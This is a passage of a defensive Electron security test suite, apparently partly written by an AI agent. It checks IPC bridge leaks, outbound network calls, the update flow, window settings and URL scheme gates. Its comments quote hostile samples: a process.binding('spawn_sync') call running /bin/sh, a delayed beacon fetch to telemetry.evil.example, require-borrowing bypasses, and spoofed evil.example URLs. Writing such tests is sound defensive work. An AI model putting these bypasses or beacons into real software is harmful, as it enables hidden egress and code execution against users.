for (const [name, passed] of Object.entries(bridge.walkerSelfTest || {})) {
  ok(passed === true,
    `SELF-TEST: the ipcRenderer leak walker failed its own "${name}" case. It must find the module `
    + 'object, any of its methods, and either nested one or several levels inside a returned object; '
    + 'it must NOT flag a clean object, and must not hang on a cyclic one.');
}
ok(Object.keys(bridge.walkerSelfTest || {}).length >= 10,
  'SELF-TEST: the walker self-test must actually report its cases — an empty object would make the '
  + 'loop above iterate over nothing.');
// Named individually: the loop above only checks whatever cases are PRESENT, so
// deleting a case would silently retire the capability it proves.
for (const name of ['findsTopLevel', 'findsMethod', 'findsNested', 'findsDeep', 'ignoresClean',
  'survivesCycle', 'findsReturnedClosure', 'ignoresInertClosure', 'probeLeavesNoTrace']) {
  ok(name in (bridge.walkerSelfTest || {}),
    `SELF-TEST: the walker no longer reports its "${name}" case. Review 3 got past this file with `
    + '`(c) => ipcRenderer.send(ok, c) || ((...a) => ipcRenderer.send(...a))`: a RETURNED CLOSURE is '
    + 'identity-equal to nothing, so only invoking it reveals that it reaches IPC on a '
    + 'renderer-chosen channel. Dropping a case silently retires that detection.');
}

ok(bridge.members.length > 0,
  'CONTROL: the bridge must expose at least one member — zero members would make every leak check '
  + 'below pass by iterating over nothing.');
for (const m of bridge.members) {
  ok(m.type === 'function',
    `bridge member "${m.name}" must be a function (got ${m.type}). A non-function member is a value `
    + 'handed across the isolation boundary, not one narrow call.');
  ok(!m.leaksDirectly,
    `bridge member "${m.name}" IS the live ipcRenderer object or one of its methods. Compared by `
    + 'identity, so an alias, a rename or a property copy all fail here.');
  ok(!m.leaksViaReturn,
    `bridge member "${m.name}" RETURNS the live ipcRenderer or one of its methods. `
    + '`() => ipcRenderer.send` is the shape that defeated the text-matching guard: it is an arrow '
    + 'function whose return value is a generic sender for every channel in the app.');
}
// Whatever channels the members actually used must be the known-narrow ones.
const ALLOWED_CHANNELS = ['set-background-color'];
for (const ch of [...bridge.sent, ...bridge.invoked]) {
  ok(ALLOWED_CHANNELS.includes(ch),
    `the bridge sent on channel ${JSON.stringify(ch)}, which is not in ${JSON.stringify(ALLOWED_CHANNELS)}. `
    + 'A renderer-chosen channel means the renderer picks which main-process handler to reach.');
}
ok(bridge.sent.length + bridge.invoked.length > 0,
  'CONTROL: invoking the exposed members must actually reach the fake ipcRenderer — if nothing is '
  + 'ever recorded, the channel assertions above are vacuous.');

// ─────────────────────────────────────────────────────────────────────────────
// 3. EGRESS — every socket the main process opens, by recorded call.
// ─────────────────────────────────────────────────────────────────────────────
const egress = run('egress');
const UPDATE_HOST = 'nash-equilibrium-simulator.com';
ok(egress.networkCalls.length > 0,
  'CONTROL: the update check must actually fire during the run. Zero recorded calls would let this '
  + 'section "prove" the app is silent by never giving it the chance to speak.');
for (const [api, target] of egress.networkCalls) {
  let host = null;
  try { host = new URL(target).host; } catch { host = null; }
  ok(host === UPDATE_HOST,
    `the main process made a ${api} call to ${JSON.stringify(target)} (host ${host}). The only `
    + `outbound destination permitted in this offline desktop app is ${UPDATE_HOST}. Recorded at the `
    + 'API layer, so a URL built by concatenation, a template literal, or an alias is caught the '
    + 'same way — including a hostile host that merely MENTIONS the update constant.');
}
// FOUND BY THIS AGENT, sweep 2. The update server's JSON is UNTRUSTED INPUT:
// whoever answers /api/version — the host, a proxy, a captive portal, DNS —
// chooses every field in it. The fake used to reply with exactly `{version}`,
// which tests only the happy path. It now replies with every plausible field an
// app might follow, each carrying an attacker URL (downloadUrl, manifestUrl,
// notesUrl: javascript:, path: /etc/passwd ...). The app must ignore all of
// them: whatever it dials lands in networkCalls above and whatever it hands the
// OS lands in openedUrls below, so `openExternalIfSafe(data.downloadUrl || ...)`
// fails without needing an assertion of its own.
ok(egress.dialogsShown.length > 0,
  'CONTROL: the update dialog must actually be shown, and the fake answers "Download Update". '
  + 'If the dialog never appears, the only branch that hands a URL to the OS is never taken and '
  + 'the openedUrls check below is reading an empty list.');
for (const u of egress.openedUrls) {
  ok(u === 'https://nash-equilibrium-simulator.com/api/download/dmg',
    `the update flow handed the OS ${JSON.stringify(u)}. The download URL must be built from the `
    + 'compiled-in UPDATE_BASE_URL constant and nothing else — the server\'s reply supplied '
    + 'downloadUrl/url/dmg/manifestUrl fields pointing at evil.example, and following any of them '
    + 'turns "check for updates" into "run whatever the server names".');
}

// The renderer's security model is set on the WINDOW, not in the preload: with
// contextIsolation off, the preload's globals ARE the page's globals and every
// bridge guarantee in section 2 is void — while all of those checks still pass,
// because they measure the preload, not the window it is loaded into.
ok(egress.windowOptions.length > 0,
  'CONTROL: at least one BrowserWindow must be constructed during the run.');
// The KEY SET, not a list of known-dangerous names. Naming contextIsolation /
// nodeIntegration / sandbox / devTools individually leaves every OTHER
// webPreference free: webSecurity:false turns off CORS and same-origin,
// allowRunningInsecureContent lets http: script into an https: page,
// webviewTag re-enables <webview>, nodeIntegrationInSubFrames hands require()
// to an iframe, experimentalFeatures switches on unshipped Blink code. Each was
// a surviving mutant. An allowlist of the exact keys catches all of them and
// every one nobody has thought of yet, which is the point.
for (const wp of egress.windowOptions) {
  assert.deepStrictEqual(wp, {
    nodeIntegration: false,
    contextIsolation: true,
    sandbox: true,
    devTools: false,
    preload: wp && wp.preload,
  }, `a window's webPreferences were ${JSON.stringify(wp)}. Exactly these five keys, with these `
    + 'values. contextIsolation off would make every bridge check above pass while the isolation '
    + 'they assume does not exist; nodeIntegration on hands require() to a renderer displaying '
    + 'model-generated content; and any ADDED key is a Chromium security default being turned off '
    + 'in a place nothing else in this file looks at.');
  checks++;
  ok(typeof wp.preload === 'string' && wp.preload.endsWith('/electron-preload.cjs'),
    `the window's preload is ${JSON.stringify(wp && wp.preload)} — it must be the app's own `
    + 'electron-preload.cjs, the file the bridge section actually audits. A preload from anywhere '
    + 'else means the audited file is not the one that runs.');
}

// The same flow under the two server replies a real user hits: a broken server
// and a garbage version string. Both used to be guarded only by the source-text
// regex contract — the layer three consecutive reviews defeated with a new
// spelling each time. A defect only the regex catches is one rename from
// shipping, so both are behavioural now.
//
// The invariant for each is the same and needs no new vocabulary: NO dialog is
// shown and NOTHING reaches the OS. An update prompt is the one thing that
// moves a user to download and run a binary.
for (const [reply, why] of [
  ['notok', 'the update endpoint answered 503. An error body still parses as JSON, and a captive '
    + 'portal answers 200 with a login page — acting on a non-ok response means any failing or '
    + 'hostile intermediary can raise the prompt'],
  ['junkversion', "the server's version was '999junk.0.0', which is not a version. parseInt used "
    + 'to read it as 999.0.0 and prompt every installed copy to download; a corrupted or '
    + 'hand-edited manifest must compare as "no update", not as "newer"'],
]) {
  const r = run('egress', { UPDATE_REPLY: reply, EGRESS_PROBE_PORT: reply === 'notok' ? '4898' : '4899' });
  ok(r.networkCalls.length > 0,
    `CONTROL (${reply}): the update check must still FIRE, or this case proves nothing by never `
    + 'letting the app reach the code under test.');
  assert.deepStrictEqual(r.dialogsShown, [],
    `an update dialog was shown when ${why}. Shown: ${JSON.stringify(r.dialogsShown)}.`);
  checks++;
  assert.deepStrictEqual(r.openedUrls, [],
    `the OS was handed ${JSON.stringify(r.openedUrls)} when ${why}.`);
  checks++;
}

// The module list IS the egress surface: a network module that is never
// required cannot be called, whatever the call-site text looks like.
const ALLOWED_MODULES = ['electron', 'path', 'fs', './dist/server.cjs'];
// ESM `import()` bypasses Module._load entirely — verified: the dynamic import
// resolves the REAL module and the interception hook never sees it. So
// `await import('node:tls')` would make a live connection that the recorded
// networkCalls above cannot see. The static import surface is therefore part
// of the same invariant, not a separate nicety.
ok(Array.isArray(egress.dynamicImports),
  'the runner must report electron-main.cjs\'s import() / from-import specifiers.');
for (const spec of egress.dynamicImports) {
  ok(!spec.startsWith('<computed:'),
    `electron-main.cjs contains a non-literal import specifier (${spec}). A computed import cannot `
    + 'be checked statically and cannot be intercepted at runtime, so it is an unbounded egress '
    + 'route: write the specifier as a literal.');
  const bare = spec.replace(/^node:/, '');
  ok(ALLOWED_MODULES.includes(spec) || ALLOWED_MODULES.includes(bare),
    `electron-main.cjs dynamically imports ${JSON.stringify(spec)}, which is not in `
    + `${JSON.stringify(ALLOWED_MODULES)}. import() does NOT go through Module._load, so a network `
    + 'module pulled in this way makes real connections that the call recorder never sees.');
}

assert.deepStrictEqual(egress.requiredModules.slice().sort(), ALLOWED_MODULES.slice().sort(),
  `electron-main.cjs must require exactly ${JSON.stringify(ALLOWED_MODULES)} (got `
  + `${JSON.stringify(egress.requiredModules)}). Adding net/tls/http2/dgram/dns/child_process/ws here `
  + 'is the precondition for any egress route that does not go through fetch. '
  + '`getBuiltinModule:` / `binding:` / `_linkedBinding:` entries are the three APIs that bypass '
  + 'Module._load entirely and have no legitimate use in this app. SR-52: process.binding('
  + "'spawn_sync') ran /bin/sh from the main process with every check here green.");
checks++;

// SR-52, mutation-named. Each of these ran against the real electron-main.cjs
// and the suite stayed green before the runner recorded the door:
//   process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c',
//     'echo PWNED > /tmp/b22-exfil-proof.txt'],stdio:[…]})   -> the file was written
//   process.binding('tcp_wrap')  -> a live TCP / TCPConnectWrap pair
// So assert the instrumentation exists, not only that today's list is clean: a
// future runner edit that drops the wrapper would make the check above pass for
// the wrong reason (nothing recorded because nothing is watching).
// SR-55, the same class one level up. The census attributed a load by
// `parent.filename`, which asks WHOSE require object was used — and
// electron-main can borrow another one. `require.main.require('dns')` resolves
// through the RUNNER's module, so parent.filename was the runner and the census
// stayed empty; a worker spawned that way ran dns.lookup in a SEPARATE THREAD,
// where none of the in-process patches exist, and wrote its proof file with all
// 452 checks green. Attribution is now by nearest call-stack frame.
//
// This CONTROL pins both directions, because the walk failed both ways while I
// was writing it: too loose and the BACKEND's 39 transitive modules were
// credited to electron-main (it requires dist/server.cjs synchronously, so
// electron-main is always further down the stack); too tight and the borrowed
// spellings walked free again.
ok(egress.requiredModules.includes('./dist/server.cjs'),
  'CONTROL: the census must still credit electron-main with its OWN requires. If this is missing '
  + 'the stack walk has become too strict and every borrowed-require check below passes vacuously.');
for (const m of ['express', 'nodemailer', 'openai', 'dotenv']) {
  ok(!egress.requiredModules.includes(m),
    `CONTROL: ${m} is a module the BACKEND requires, not electron-main. Its presence means the `
    + 'stack walk got too loose and is crediting electron-main with everything dist/server.cjs '
    + 'pulls in — which would make the exact-list assertion fail for a correct product.');
}

for (const door of ['binding', '_linkedBinding', 'getBuiltinModule']) {
  ok((egress.moduleDoorsInstrumented || []).includes(door),
    `CONTROL: process.${door} is not instrumented by the runner, so a module obtained through it `
    + 'never appears in the require census above and that census would be clean by blindness. '
    + "process.binding('spawn_sync') is a working child-process door that needs no require.");
}

// The backend is the other half of the desktop process, and the half with an
// LLM client in it. It used to be stubbed to `{}` here, which meant this whole
// section measured electron-main alone and called that "the app's egress".
// FOUND BY MY OWN SELF-REVIEW. Every recorded-call check above observes a
// WINDOW, and a window can be outwaited: `setTimeout(() =>
// fetch('https://telemetry.evil.example/late'), 9000)` produced no finding at
// 4200ms. Raising the number only moves the goalpost — a beacon at startup+60s
// would still be silent, and it is no less egress for being late.
//
// So the app's PENDING TIMERS are censused too. A recorded call answers "what
// did it dial?"; this answers "what is it still going to do?", which no wait
// can reach. The app schedules exactly one timer (the update check at 3000ms)
// and it fires inside the window, so nothing may still be armed at report time.
assert.deepStrictEqual(egress.pendingTimers, [],
  `the main process still had timer(s) armed at ${JSON.stringify(egress.pendingTimers)}ms when the `
  + 'observation window closed. Work scheduled past the window is invisible to every recorded-call '
  + 'check above, which is exactly what makes it worth doing: a delayed beacon is still a beacon. '
  + 'If a legitimate long timer is added, this check must be widened deliberately.');
checks++;

ok(egress.backendLoaded === true,
  'CONTROL: the real dist/server.cjs must be loaded during the egress run. While it was stubbed to '
  + '{}, every outbound call the BACKEND makes — the LLM provider, the scenario bank fetches, '
  + 'anything a future route adds — was outside the measurement entirely.');
// Wrapping the builtins in place is what closes the two doors Module._load
// cannot see: ESM import() and process.getBuiltinModule() both hand back the
// REAL module object (both verified), so only instrumenting that object works.
for (const label of ['net.Socket.connect', 'tls.connect', 'https.request', 'http.request',
  'http2.connect', 'dns.lookup', 'dgram.createSocket', 'child_process.spawn']) {
  ok((egress.instrumented || []).includes(label),
    `CONTROL: ${label} was not instrumented, so a call through it would be invisible. The recorder `
    + 'wraps the real builtin objects in place precisely because import() and getBuiltinModule() '
    + 'return those same objects while bypassing Module._load.');
}

// ─────────────────────────────────────────────────────────────────────────────
// 4. OPEN-EXTERNAL — what actually reached the OS, by recorded argument.
// ─────────────────────────────────────────────────────────────────────────────
const ext = run('openexternal');
ok(ext.windowOpenHandlerInstalled,
  'setWindowOpenHandler must be installed: without it window.open() opens a real Electron window '
  + 'with no scheme policy at all.');
ok(ext.willNavigateHandlerCount > 0,
  'at least one will-navigate handler must be installed — window.open and in-page navigation are '
  + 'two separate doors to the same capability.');
ok(ext.windowOpenVerdicts.length >= 8,
  `every hostile scheme must be driven through the handler (got ${ext.windowOpenVerdicts.length}).`);
for (const [url, action] of ext.windowOpenVerdicts) {
  ok(action === 'deny',
    `window.open(${JSON.stringify(url)}) returned action=${JSON.stringify(action)}; it must always be `
    + '"deny" — the app opens links via the scheme-gated wrapper, never as a new Electron window.');
}
// The frame section below has this control; this one did not, found by my own
// self-review. Deleting the will-navigate handler empties navigationPrevented,
// and a loop over an empty list passes — the mutant died only on the LATE-
// contents check further up, i.e. this section was carried by another one.
// Every "for every recorded X" needs its own "X was recorded at all".
ok(ext.navigationPrevented.length >= 8,
  `every hostile URL must be driven through the will-navigate handler (got `
  + `${ext.navigationPrevented.length}). An empty list makes the loop below pass by iterating `
  + 'over nothing, which is exactly how deleting the handler would look.');
for (const [url, prevented] of ext.navigationPrevented) {
  ok(prevented === true,
    `a will-navigate to ${JSON.stringify(url)} was NOT prevented. The window must stay on its own `
    + 'origin; anything else is navigated externally through the scheme gate or not at all.');
}
// `will-frame-navigate` is a SEPARATE Electron event, and the product handles
// it separately (electron-main.cjs, next to the will-navigate handler). The
// fake used to record only `will-navigate`, so this door read as covered while
// nothing was ever driven through it — the handler could have been deleted and
// this file would not have noticed.
ok(ext.willFrameNavigateHandlerCount > 0,
  'a will-frame-navigate handler must be installed. will-navigate does NOT fire for subframe '
  + 'navigations, so an iframe in model-rendered content is a third door to the same capability.');
ok(ext.framePrevented.length >= 8,
  `every hostile scheme must be driven through the frame handler (got ${ext.framePrevented.length}).`);
for (const [url, prevented] of ext.framePrevented) {
  ok(prevented === true,
    `a will-frame-navigate to ${JSON.stringify(url)} was NOT prevented. The suffix names the `
    + 'argument SHAPE: Electron has passed both `(event)` with the URL on the event and '
    + '`(event, details)` with it on the details, so a handler that reads only one shape fails '
    + 'open on real Electron versions that send the other.');
}
// THE CONTROL for both events. Everything above passes for a handler that calls
// preventDefault() unconditionally without ever parsing the URL — which would
// also break every in-app link and send nothing to the OS. The app's own origin
// must pass through untouched, which is only possible if the URL was read.
ok(ext.inApp.length > 0,
  'CONTROL: the in-app navigation probe must run, or nothing forces these handlers to actually '
  + 'READ the URL rather than blanket-prevent.');
for (const [where, prevented, opened] of ext.inApp) {
  ok(prevented === false,
    `${where} prevented a navigation to the app's OWN origin (${ext.appOriginProbed}). A handler `
    + 'that blanket-prevents satisfies every hostile-scheme assertion above while breaking in-app '
    + 'navigation entirely — this is the check that distinguishes a policy from a wall.');
  ok(opened === false,
    `${where} handed the app's own URL (${ext.appOriginProbed}) to the OS. An in-app route must `
    + 'never be bounced out to a browser.');
}

// FOUND BY THIS AGENT, sweep 40, reproduced against the unfixed tree first.
// The app's origin is not a constant: server.ts retries port+1 forever on
// EADDRINUSE under IS_ELECTRON (another copy of the app, or anything already
// on 14321) and reports the port it FINALLY bound via `onExpressListening`.
// If a window already exists — the 800ms slow-boot fallback fired, which is
// precisely the case where the server was slow BECAUSE it was walking the
// port range — that handler moves the window to the new port. The navigation
// allowlist has to move with it.
//
// Before the fix the allowlist was assigned ONLY inside createWindow(), so
// after such a move every one of these was true at once (measured):
//   - the window was showing 127.0.0.1:<new>, and every in-app navigation
//     there was preventDefault'd and shipped to shell.openExternal, where the
//     scheme filter refused it — so in-app links silently did nothing at all;
//   - 127.0.0.1:<old>, a port this app has LEFT and another process now owns,
//     was still on the allowlist and still navigable.
ok(ext.portMoveDriven === true,
  'CONTROL: onExpressListening must be callable a SECOND time with a new port, the way '
  + "server.ts's EADDRINUSE retry calls it. If that door does not exist, every assertion below "
  + 'measures nothing.');
// THE CONTROL THAT MAKES THIS A TEST OF THE RIGHT ARM. `onExpressListening`
// creates a window when there is none and MOVES the existing one when there
// is; only the move is at issue here, and the create arm assigns the origin
// on any tree. Measured: with the probe placed after the window-event loop
// (which fires 'closed' and nulls mainWindow) the call took the create arm
// and all of this passed with the fix reverted.
ok(ext.windowsAfterMove === ext.windowsBeforeMove,
  `the port move CREATED a window (${ext.windowsBeforeMove} -> ${ext.windowsAfterMove}) instead `
  + 'of moving the existing one. That is the other arm of onExpressListening, which assigns the '
  + 'origin unconditionally — so these checks would pass whether or not the move arm does.');
ok(ext.loadedUrlsAtMove[ext.loadedUrlsAtMove.length - 1] === `http://127.0.0.1:${ext.movedPort}`,
  `CONTROL: the window must actually have been pointed at port ${ext.movedPort} by the move `
  + `(last loadURL was ${JSON.stringify(ext.loadedUrlsAtMove[ext.loadedUrlsAtMove.length - 1])}). `
  + 'Without that, "the allowlist followed the window" describes a window that never moved.');
ok(ext.originalPort !== ext.movedPort,
  `CONTROL: the moved-to port (${ext.movedPort}) must differ from the original (${ext.originalPort}).`);
ok(ext.inAppAfterMove.length > 0,
  'CONTROL: the post-move navigation probe must actually run.');
for (const [where, prevented, opened] of ext.inAppAfterMove) {
  ok(prevented === false,
    `after the server moved to port ${ext.movedPort}, ${where} PREVENTED a navigation to the `
    + "window's own new origin. The allowlist is still naming the port the app has left, so every "
    + 'in-app link is now treated as external.');
  ok(opened === false,
    `after the port move, ${where} handed the app's OWN new-origin URL to the OS.`);
}
for (const [where, prevented] of ext.staleAfterMove) {
  ok(prevented === true,
    `after the server moved to port ${ext.movedPort}, ${where} still ALLOWED a navigation to the `
    + `OLD origin (127.0.0.1:${ext.originalPort}). That port belongs to whatever process took it — `
    + 'the allowlist must follow the window, not accumulate every port the app has ever used.');
}
// FOUND BY THIS AGENT, sweep 2. Navigation and window.open are not the only
// doors to the OS: Electron hands the app URLs through LIFECYCLE events too.
// `app.on('open-url', (e, u) => shell.openExternal(u))` is the same capability
// with none of the scheme policy, and nothing here drove those handlers at all.
// Every registered app event is now fired with hostile payloads, and whatever
// reaches the OS lands in openedUrls below like any other door.
ok(ext.lifecycleEventsDriven.length >= 3,
  "CONTROL: the app's lifecycle handlers must actually be driven (drove "
  + `${JSON.stringify(ext.lifecycleEventsDriven)}). With none driven, an open-url handler that `
  + 'forwards straight to the OS would never be exercised.');
// FOUND BY THIS AGENT, sweep 2. `executeJavaScript` runs arbitrary code IN THE
// RENDERER from the main process, to one side of every policy this file checks:
// the permission handlers, the navigation gate and the contextBridge all sit
// elsewhere. It is called from the fullscreen handlers, which are registered on
// `mainWindow.on` — and the fake ignored window events entirely, so those
// handlers had never run here at all. Both are driven now and every script is
// recorded and pinned.
assert.deepStrictEqual(ext.injectedScripts, [
  "window.dispatchEvent(new CustomEvent('electron-fullscreen-change', { detail: true }))",
  "window.dispatchEvent(new CustomEvent('electron-fullscreen-change', { detail: false }))",
], `the main process injected ${JSON.stringify(ext.injectedScripts)} into the renderer. Only these `
  + 'two fixed fullscreen notifications are allowed, verbatim. Any interpolation here is a '
  + 'main-process eval in the page: whatever value is spliced in runs as code, and nothing else in '
  + 'this file would see it.');
checks++;
assert.deepStrictEqual(ext.injectedCss, [],
  `the main process injected CSS: ${JSON.stringify(ext.injectedCss)}.`);
checks++;
ok(ext.windowEventsDriven.length >= 2,
  `CONTROL: the window's own event handlers must be driven (drove `
  + `${JSON.stringify(ext.windowEventsDriven)}), or the injection list above is empty for the `
  + 'boring reason that nothing ever called it.');
// The window must only ever be pointed at its own loopback server.
for (const u of ext.loadedUrls) {
  ok(/^http:\/\/127\.0\.0\.1:\d+$/.test(u),
    `loadURL was called with ${JSON.stringify(u)}. The window loads the app's own loopback origin `
    + 'and nothing else — a remote origin here means the whole UI is served by someone else, and '
    + "with titleBarStyle 'hidden' there is no URL bar to show it.");
}
ok(ext.loadedUrls.length > 0, 'CONTROL: the window must actually be pointed at a URL.');

// FOUND BY THIS AGENT, sweep 2. The navigation gate must compare the parsed
// ORIGIN, not look for the app's host inside the string. The hostile set now
// includes look-alikes that a substring or suffix check accepts:
//   https://127.0.0.1.evil.example/x          host is a SUBDOMAIN of evil
//   http://127.0.0.1:14322@evil.example/x     the app's origin as USERINFO
//   https://evil.example/?x=http://127.0.0.1  the app's origin in the query
//   https://127.0.0.1:14322/x                 the app's host, other scheme
// Each is a remote origin driving the whole UI inside a window that has no URL
// bar (titleBarStyle: 'hidden'), so nothing on screen would say so. They are
// asserted by the loops above — every one must be prevented, and the scheme
// gate decides separately whether it may be handed to the OS.
for (const u of ext.openedUrls) {
  ok(!/^https?:\/\/[^/]*@/.test(u),
    `the OS was handed ${JSON.stringify(u)}, which carries USERINFO before the host. `
    + '"http://127.0.0.1:14322@evil.example/" reads as the app\'s own origin to a human and to a '
    + 'substring check; its actual origin is evil.example.');
}
// A URL with a control character or leading whitespace must not survive into
// the OS call in its raw form: `new URL()` normalises, and passing the RAW
// string instead of the parsed one is how a gate validates one thing and acts
// on another.
for (const u of ext.openedUrls) {
  ok(u === u.trim() && !/[\u0000-\u001f]/.test(u),
    `the OS was handed ${JSON.stringify(u)} with whitespace or a control character intact — the `
    + 'parsed URL was validated but the RAW string was passed on.');
}

// Same shape one layer down: every main-process IPC channel is renderer-reachable.
assert.deepStrictEqual(ext.ipcChannels, [['on', 'set-background-color']],
  `the main process listens on ${JSON.stringify(ext.ipcChannels)}. Exactly one channel may be `
  + 'registered, by `on`. Every channel here is reachable from any script the page runs, so a '
  + 'second one is a second capability — measured by what the app REGISTERS, not by what the '
  + 'preload chooses to expose, because the preload is not the only way to reach ipcMain.');
checks++;
// FOUND BY THIS AGENT, sweep 2. Registering the channel set is one question;
// what the handler DOES with renderer-controlled input is another, and nothing
// asked it. These run in the main process with full Node privileges and their
// only input is whatever the page sends. Driven with 22 payloads — wrong types,
// a function, a Symbol, a 30KB string, a toString() that returns a valid colour,
// CSS injection, a NUL prefix, a trailing newline, a leading space.
assert.deepStrictEqual(ext.ipcAccepted, [['set-background-color', '#001122']],
  `the IPC handlers accepted ${JSON.stringify(ext.ipcAccepted)}. Exactly one payload may get `
  + 'through — the plain 6-digit hex POSITIVE CONTROL. Everything else must be rejected before it '
  + 'reaches a native API: " #001122" and "#001122\\n" are not hex, and an object whose toString() '
  + 'returns one is a renderer-supplied getter running in the main process.');
checks++;
assert.deepStrictEqual(ext.ipcThrew, [],
  `an IPC handler THREW on renderer input: ${JSON.stringify(ext.ipcThrew)}. A page can send `
  + 'anything, so an uncaught throw here is a renderer-triggered main-process error.');
checks++;
ok(ext.ipcAccepted.length > 0,
  'CONTROL: the positive payload must be accepted. With only hostile payloads, "nothing was '
  + 'accepted" is indistinguishable from "the handler was never reached" — which is exactly what '
  + 'happened while BrowserWindow.fromWebContents returned null and `if (win)` was always false.');

ok(ext.openedUrls.length > 0,
  'CONTROL: at least one URL must reach shell.openExternal during the run, or the scheme assertions '
  + 'below are checking an empty list — which is exactly how a broken harness looks like a pass.');
for (const u of ext.openedUrls) {
  ok(u.startsWith('https://'),
    `the OS was handed ${JSON.stringify(u)}, which is not an https URL. (An "openPath:" or `
    + '"showItemInFolder:" prefix means a DIFFERENT shell door was used — those reach the OS too, '
    + 'so they are recorded in the same list.) Recorded on the fake '
    + 'function itself, so destructuring (`const { openExternal } = shell`), aliasing, or calling it '
    + 'from inside a template interpolation records identically — the spelling cannot hide the call. '
    + 'file:// opens Finder on an arbitrary path; javascript:/data: execute.');
}

console.log(`electron-behavior.test.mjs: ${checks} checks passed`);
